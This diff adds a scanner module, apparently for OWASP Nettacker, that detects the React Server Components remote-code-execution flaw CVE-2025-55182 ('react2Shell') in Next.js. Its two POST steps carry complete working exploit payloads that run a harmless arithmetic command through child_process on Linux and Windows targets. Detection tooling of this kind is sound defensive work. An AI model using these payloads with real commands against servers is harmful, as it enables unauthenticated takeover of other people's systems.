@@ -1,0 +1,93 @@
+info:
+  name: nextjs_cve_2025_55182_vuln
+  author: Sankalp Bansal
+  severity: 10.0
+  description: >
+    CVE-2025-55182/CVE-2025-66478(popularly known as react2Shell) is a critical
+    vulnerability in react and frameworks/tools that support React Server Components.
+    Affected versions: 
+      - reactjs: v19.0, 19.1.0, 19.1.1 and 19.2.0
+      - nextjs: v15.x, 16.x, 14.3.0-canary.77 and later canary releases
+    This vulnerability exploits the react flight protocol which is used by RSC
+    to deserialize the input from client. It leads to unauthenticated RCE on the 
+    server.
+    NOTE: When scanning local development servers ('next dev'), use '--timeout 20' 
+    to account for initial compilation latency. Production servers do not require this.
+    NOTE: CVE-2025-66478 was identified as a duplicate of CVE-2025-55182, and hence was
+    rejected later.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2025-55182
+    - https://nvd.nist.gov/vuln/detail/CVE-2025-66478
+    - https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components
+    - https://www.wiz.io/blog/nextjs-cve-2025-55182-react2shell-deep-dive
+  profiles:
+    - vuln
+    - http
+    - critical_severity
+    - cve
+    - cve2025
+    - reactjs
+    - react2shell
+    - nextjs
+    - rce
+    - cisa_kev
+
+payloads:
+  - library: http
+    steps:
+      - method: post
+        timeout: 10
+        headers:
+          User-Agent: "{user_agent}"
+          next-action: "x"
+          Content-Type: "multipart/form-data; boundary=WebKitFormBoundaryx2pO7Ptc6DDP3Sad"
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        data: "--WebKitFormBoundaryx2pO7Ptc6DDP3Sad\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n\"$1\"\r\n--WebKitFormBoundaryx2pO7Ptc6DDP3Sad\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n{{\"status\":\"resolved_model\",\"reason\":0,\"_response\":\"$4\",\"value\":\"{{\\\"then\\\":\\\"$3:map\\\",\\\"0\\\":{{\\\"then\\\":\\\"$B3\\\"}},\\\"length\\\":1}}\",\"then\":\"$2:then\"}}\r\n--WebKitFormBoundaryx2pO7Ptc6DDP3Sad\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n\"$@3\"\r\n--WebKitFormBoundaryx2pO7Ptc6DDP3Sad\r\nContent-Disposition: form-data; name=\"3\"\r\n\r\n[]\r\n--WebKitFormBoundaryx2pO7Ptc6DDP3Sad\r\nContent-Disposition: form-data; name=\"4\"\r\n\r\n{{\"_prefix\":\"var res=process.mainModule.require('child_process').execSync('echo $((41*271))').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});\",\"_formData\":{{\"get\":\"$3:constructor:constructor\"}},\"_chunks\":\"$2:_response:_chunks\"}}\r\n--WebKitFormBoundaryx2pO7Ptc6DDP3Sad--\r\n"
+        response:
+          condition_type: and
+          conditions:
+            headers:
+              x-action-redirect:
+                regex: "/login\\?a=11111"
+                reverse: false
+      - method: post
+        timeout: 10
+        headers:
+          User-Agent: "{user_agent}"
+          next-action: "x"
+          Content-Type: "multipart/form-data; boundary=WebKitFormBoundaryx2pO7Ptc6DDP3Bad"
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        data: "--WebKitFormBoundaryx2pO7Ptc6DDP3Bad\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n\"$1\"\r\n--WebKitFormBoundaryx2pO7Ptc6DDP3Bad\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n{{\"status\":\"resolved_model\",\"reason\":0,\"_response\":\"$4\",\"value\":\"{{\\\"then\\\":\\\"$3:map\\\",\\\"0\\\":{{\\\"then\\\":\\\"$B3\\\"}},\\\"length\\\":1}}\",\"then\":\"$2:then\"}}\r\n--WebKitFormBoundaryx2pO7Ptc6DDP3Bad\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n\"$@3\"\r\n--WebKitFormBoundaryx2pO7Ptc6DDP3Bad\r\nContent-Disposition: form-data; name=\"3\"\r\n\r\n[]\r\n--WebKitFormBoundaryx2pO7Ptc6DDP3Bad\r\nContent-Disposition: form-data; name=\"4\"\r\n\r\n{{\"_prefix\":\"var res=process.mainModule.require('child_process').execSync('powershell -c \\\"41*271\\\"').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});\",\"_formData\":{{\"get\":\"$3:constructor:constructor\"}},\"_chunks\":\"$2:_response:_chunks\"}}\r\n--WebKitFormBoundaryx2pO7Ptc6DDP3Bad--\r\n"
+        response:
+          condition_type: and
+          conditions:
+            headers:
+              x-action-redirect:
+                regex: "/login\\?a=11111"
+                reverse: false
